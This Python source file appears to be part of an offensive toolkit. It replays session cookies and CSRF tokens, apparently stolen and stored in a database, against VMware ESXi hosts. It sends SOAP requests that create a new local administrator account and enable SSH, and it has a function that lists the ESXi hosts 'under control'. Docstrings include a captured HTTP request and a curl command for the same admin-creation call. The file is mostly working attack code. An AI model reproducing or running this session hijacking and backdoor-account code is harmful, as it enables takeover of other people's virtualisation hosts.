from Lib.Pull import *

"""
This is the main function for ESXI_UI lib

Whenever you want to add a req, you have to add 2 things. 

One, a function that takes:
ip, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value, SOAPAction_Value, data
The function should call VMware_ESXI_Generic() and passes all arguments to it.
The only parameter you should edit/should be different from other functions is "data".
"data" should be the data that is being passed in the POST request.
Two, Add a condition on this function and add a new "task" name for it so you can call it using this function.

For more examples, take a look at VMware_ESXI_Add_Admin and VMware_ESXI_Enable_SSH.


Important: IP and task must be must be passed to this function!!! 
task could be "Add_Admin" or "Enable_SSH"


Disadvantage: If the data base is large, this will take a while! 

NOT IMPORTANT TODO: Optimize it!
"""
def Execute_VMware_ESXI(ip, task,username = '', password = '', description = ''):
    vmware_clientList, vmware_soap_sessionList, VMware_CSRF_TokenList, SOAPActionList = getAuthTokens4ESXI(ip)
    for vmware_client in vmware_clientList:
        for vmware_soap_session in vmware_soap_sessionList:
            for VMware_CSRF_Token in VMware_CSRF_TokenList:
                for SOAPAction in SOAPActionList:
                    #
                    # TODO Threaded
                    #

                    if task == 'Add_Admin':
                        #                     (ip , username, password, description, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value, SOAPAction_Value)
                        r = VMware_ESXI_Add_Admin('192.168.0.18', username, password, description, vmware_client, vmware_soap_session, VMware_CSRF_Token, SOAPAction)
                    elif task == 'Enable_SSH':
                        r = VMware_ESXI_Enable_SSH('192.168.0.18', vmware_client, vmware_soap_session, VMware_CSRF_Token, SOAPAction)
                    else:
                        r = None




"""
Notes:
Has been tested on ESXI 6.5 on Fri, Aug 23



To add an admin using the Web interface, the next are required:

POST /sdk/ HTTP/1.1
Host: 192.168.0.18
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
SOAPAction: urn:vim25/6.5
VMware-CSRF-Token: rv6p72uh3mgvxqt32e23e23e23e2xk
Content-Length: 354
Connection: close
Cookie: vmware_client=VMware; vmware_soap_session="84f5995aa3121212123778c8cbcd6ac"

<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><CreateUser xmlns="urn:vim25"><_this type="HostLocalAccountManager">ha-localacctmgr</_this><user><id>TestUsername</id><password>MohammedPassword!1</password><description>Description1</description></user></CreateUser></Body></Envelope>
<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><CreateUser xmlns="urn:vim25"><_this type="HostLocalAccountManager">ha-localacctmgr</_this><user><id>KKKK</id><password>MohammedPassword!1</password><description>KKKKDD</description></user></CreateUser></Body></Envelope>

Or 


curl -i -s -k  -X $'POST' \
    -H $'Host: 192.168.0.18' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: text/xml' -H $'SOAPAction: urn:vim25/6.5' -H $'VMware-CSRF-Token: rv6p72uh3mgvxqtgmvuagei68ucg3gxk' -H $'Content-Length: 354' -H $'Connection: close' -H $'Cookie: vmware_client=VMware; vmware_soap_session=\"84f59123143141224234232438cbcd6ac\"' \
    -b $'vmware_client=VMware; vmware_soap_session=\"84f5995aa8213121121238c8cbcd6ac\"' \
    --data-binary $'<Envelope xmlns=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><Body><CreateUser xmlns=\"urn:vim25\"><_this type=\"HostLocalAccountManager\">ha-localacctmgr</_this><user><id>TestUsername</id><password>MohammedPassword!1</password><description>Description1</description></user></CreateUser></Body></Envelope>' \
    $'https://192.168.0.18/sdk/'


"""


def VMware_ESXI_Generic(ip, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value, SOAPAction_Value,
                        data):
    vmware_client_Value = vmware_client_Value.strip(' ')
    vmware_soap_session_Value = vmware_soap_session_Value.strip(' ')
    SOAPAction_Value = SOAPAction_Value.strip(' ')
    VMware_CSRF_Token_Value = VMware_CSRF_Token_Value.strip(' ')
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # proxies=proxies
    headers = {
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': 'Content-Type: text/xml',
        'SOAPAction': SOAPAction_Value,
        'VMware-CSRF-Token': VMware_CSRF_Token_Value
    }
    cookies = {
        'vmware_client': vmware_client_Value, 'vmware_soap_session': vmware_soap_session_Value
    }
    r = requests.post('https://' + ip + '/sdk/', data, cookies=cookies, headers=headers, proxies=proxies, verify=False)
    if r.status_code == 200:
        print("HTTP/1.1 200 OK")
    return r


"""
Example of how to add a user:
def test_AddVM_User_Example():
    ip = '192.168.0.18'
    username = 'TestUUUUSER'
    password = 'Liverpool!1!1!'
    description = 'Description1'
    Execute_VMware_ESXI(ip,'Add_Admin', username, password, description)

"""
def VMware_ESXI_Add_Admin(ip , username, password, description, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value, SOAPAction_Value):
    ## Add user
    data = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><CreateUser xmlns="urn:vim25"><_this type="HostLocalAccountManager">ha-localacctmgr</_this><user><id>' + username + '</id><password>' + password + '</password><description>' + description + '</description></user></CreateUser></Body></Envelope>'
    VMware_ESXI_Generic(ip, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value, SOAPAction_Value,
                        data)


"""
Enable SSH:
<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><StartService xmlns="urn:vim25"><_this type="HostServiceSystem">serviceSystem</_this><id>TSM-SSH</id></StartService></Body></Envelope>
"""
def VMware_ESXI_Enable_SSH(ip, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value,
                           SOAPAction_Value):
    # Has been tested on ESXI 6.5 on Fri, Aug 23.
    data = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><StartService xmlns="urn:vim25"><_this type="HostServiceSystem">serviceSystem</_this><id>TSM-SSH</id></StartService></Body></Envelope>'
    VMware_ESXI_Generic(ip, vmware_client_Value, vmware_soap_session_Value, VMware_CSRF_Token_Value, SOAPAction_Value,
                        data)


"""
TODO: [0] or [-1] is the last added token ?

Get all Auth tokens of a specific IP 

:return: 4 lists, each one has a list of possible tokens 
"""
def getAuthTokens4ESXI(ip):
    """
    [{'_id': '5d60b15b44528e39bee05', 'Data': {'vmware_client': 'VMware', 'vmware_soap_session': 'b0e5cf6d2eeee62936199c9f42fa7e8b', 'VMware-CSRF-Token': 'p00ahb2o5yxl3ol80yeeeecpjuecmc', 'SOAPAction': 'urn:vim25/6'}, 'IP': '192.168.0.1', 'ID': '121', 'Site': 'https://192.168.0.1/sdk/', 'createdAt': '2019-08-24T03:39:07.538Z', 'updatedAt': '2019-08-24T04:12:01.512Z', '__v': 0, 'id': '5d60b15222bee05'}]

    :return:
    """
    vmware_clientList = []
    vmware_soap_sessionList = []
    VMware_CSRF_TokenList = []
    SOAPActionList = []

    j = pull('Posts')
    print(j)
    for element in j:
        # I do not think I need to check for the type.
        # /\ I need to verify that /\

        # If this ip is in the site url
        if re.search(r'' + str(ip), getSiteFromJson(element)):
            data = getDataFromJson(element)
            print(data)
            if 'vmware_client' in data:
                vmware_clientList.append(data['vmware_client'])
            if 'vmware_soap_session' in data:
                vmware_soap_sessionList.append(data['vmware_soap_session'])
            if 'VMware-CSRF-Token' in data:
                VMware_CSRF_TokenList.append(data['VMware-CSRF-Token'])
            if 'SOAPAction' in data:
                SOAPActionList.append(data['SOAPAction'])

    return vmware_clientList, vmware_soap_sessionList, VMware_CSRF_TokenList, SOAPActionList


def Print_all_ESXis_under_control():
    j = pull('Posts')
    print(j)
    for element in j:
        try:
            data = getDataFromJson(element)
            # If this ip is in the site url
            if 'VMware-CSRF-Token' in data:
                site = getSiteFromJson(element)
                print(site)
        except:
            pass